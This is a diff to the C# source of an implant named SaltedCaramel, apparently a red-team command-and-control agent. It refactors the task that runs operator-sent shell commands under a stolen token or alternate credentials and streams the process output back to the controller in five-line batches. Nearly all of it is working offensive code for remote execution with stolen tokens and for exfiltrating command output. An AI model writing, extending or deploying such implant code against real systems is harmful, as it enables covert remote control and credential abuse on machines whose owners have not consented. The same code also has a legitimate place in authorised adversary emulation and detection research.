@@ -9,6 +9,7 @@ using System.Runtime.InteropServices;
 using System.Security;
 using System.Security.AccessControl;
 using System.Threading;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
@@ -16,8 +17,9 @@ namespace SaltedCaramel.Tasks
     {
         // If we have a stolen token, we need to start a process with CreateProcessWithTokenW
         // Otherwise, we can use Process.Start
-        public static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(Job job, SCImplant implant)
         {
+            SCTask task = job.Task;
             if (implant.HasAlternateToken())
                 StartProcessWithToken(task, implant);
             else if (implant.HasCredentials() && Token.Cred.NetOnly == false)
@@ -66,7 +68,7 @@ namespace SaltedCaramel.Tasks
                         if (procOutput.Count >= 5)
                         {
                             response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
-                            implant.Profile.PostResponse(response);
+                            implant.TryPostResponse(response);
                             procOutput.Clear();
                         }
                     }
@@ -126,7 +128,7 @@ namespace SaltedCaramel.Tasks
                         if (procOutput.Count >= 5)
                         {
                             response = new SCTaskResp(task.id, JsonConvert.SerializeObject(procOutput));
-                            implant.Profile.PostResponse(response);
+                            implant.TryPostResponse(response);
                             procOutput.Clear();
                         }
                     }
@@ -209,7 +211,7 @@ namespace SaltedCaramel.Tasks
                     {
                         Debug.WriteLine("[+] DispatchTask -> StartProcessWithLogon - Created process with PID " + newProc.dwProcessId);
                         SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
-                        implant.Profile.PostResponse(procStatus);
+                        implant.TryPostResponse(procStatus);
                         // Trying to continuously read output while the process is running.
                         using (StreamReader reader = new StreamReader(pipeServer))
                         {
@@ -246,7 +248,7 @@ namespace SaltedCaramel.Tasks
                                             if (output.Count >= 5) // Wait until we have five lines to send
                                             {
                                                 response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
-                                                implant.Profile.PostResponse(response);
+                                                implant.TryPostResponse(response);
                                                 output.Clear();
                                                 Thread.Sleep(implant.SleepInterval);
                                             }
@@ -326,6 +328,7 @@ namespace SaltedCaramel.Tasks
             string[] split;
             string argString;
             string file;
+            SCTaskResp response = new SCTaskResp();
             if (task.command == "shell")
             {
                 split = task.@params.Trim().Split(' ');
@@ -384,11 +387,10 @@ namespace SaltedCaramel.Tasks
                     {
                         Debug.WriteLine("[+] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);
                         SCTaskResp procStatus = new SCTaskResp(task.id, "Created process with PID " + newProc.dwProcessId);
-                        implant.Profile.PostResponse(procStatus);
+                        implant.TryPostResponse(procStatus);
                         // Trying to continuously read output while the process is running.
                         using (StreamReader reader = new StreamReader(pipeServer))
                         {
-                            SCTaskResp response;
                             string message = null;
                             List<string> output = new List<string>();
 
@@ -421,7 +423,7 @@ namespace SaltedCaramel.Tasks
                                             if (output.Count >= 5) // Wait until we have five lines to send
                                             {
                                                 response = new SCTaskResp(task.id, JsonConvert.SerializeObject(output));
-                                                implant.Profile.PostResponse(response);
+                                                implant.TryPostResponse(response);
                                                 output.Clear();
                                                 Thread.Sleep(implant.SleepInterval);
                                             }
